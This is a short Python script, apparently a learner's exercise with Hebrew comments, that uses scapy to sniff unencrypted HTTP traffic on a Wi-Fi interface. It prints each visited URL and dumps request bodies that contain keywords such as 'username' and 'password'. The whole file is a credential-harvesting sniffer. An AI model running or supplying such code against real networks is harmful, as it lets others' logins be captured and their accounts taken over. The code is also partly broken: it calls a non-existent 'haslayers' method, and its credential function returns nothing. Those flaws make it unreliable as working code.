import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store= False, prn=process_packet)

def process_packet(packet):
    if packet.haslayers(http.HTTPRequest):
        url = get_url(packet)
        print("HTTP URL is: {}".format(url))
        cred = get_credentials(packet)
        # if there is some connection information of the user 
        if cred:
            print("Print possible credential information {}".format(cred))


keywords= ['username','user','uname','login','password','pass','signin','signup','name']

def get_credentials(packet):
    if packet.haslayer(scapy.Raw): # raw - האם קיים תוכן לבקשה
        field_load = packet[scapy.Raw].load.decode('utf-8') # נפענח את תוכן החבילה
        for keyword in keywords:
            # if word that i read from field_load locateded in keywords array
            if keyword in field_load:
                print(field_load)

def get_url(packet):
    # Host - is the name of the page(for expl Facebook)
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')

sniff("Wi-Fi")